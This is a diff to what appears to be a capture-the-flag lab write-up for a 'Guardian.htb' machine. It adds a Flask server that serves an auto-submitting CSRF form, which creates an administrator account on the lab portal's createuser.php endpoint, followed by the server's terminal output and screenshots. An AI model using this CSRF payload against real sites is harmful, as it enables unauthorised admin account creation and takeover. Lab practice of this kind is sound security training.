@@ -317,3 +317,59 @@ Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
 <img width="1684" height="145" alt="image" src="https://github.com/user-attachments/assets/62294704-2e1f-4ed8-9c0e-0f9cecc8b7f1" />
 
 <img width="1866" height="931" alt="image" src="https://github.com/user-attachments/assets/a64df8eb-ea38-4bda-8d9c-ffc2fa70458c" />
+
+<img width="1871" height="686" alt="image" src="https://github.com/user-attachments/assets/e09c5528-360f-42c8-bb70-6e8d4ca5fd23" />
+
+```py
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    html = f"""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>test</title>
+    </head>
+    <body>
+        <form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
+            <input type="hidden" name="username" value="hexada">
+            <input type="hidden" name="password" value="password">
+            <input type="hidden" name="full_name" value="New Admin">
+            <input type="hidden" name="email" value="newadmin@example.com">
+            <input type="hidden" name="dob" value="2000-01-01">
+            <input type="hidden" name="address" value="Admin Address">
+            <input type="hidden" name="user_role" value="admin">
+            <input type="hidden" name="csrf_token" value="e70653c050169609eeaca5bb023d6785">
+        </form>
+        <script>
+            document.getElementById('csrfForm').submit();
+        </script>
+    </body>
+    </html>
+    """
+
+    return Response(html, content_type="text/html")
+
+
+app.run(host="10.10.16.33", port=1818)
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ python3 server.py                                                                                         
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://10.10.16.33:1818
+Press CTRL+C to quit
+```
+
+<img width="1474" height="858" alt="image" src="https://github.com/user-attachments/assets/754e0e8b-6312-4e48-acb1-ed865313c420" />
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6ace0581-c4e5-44d7-b28c-c66fad03a6b4" />
+
+
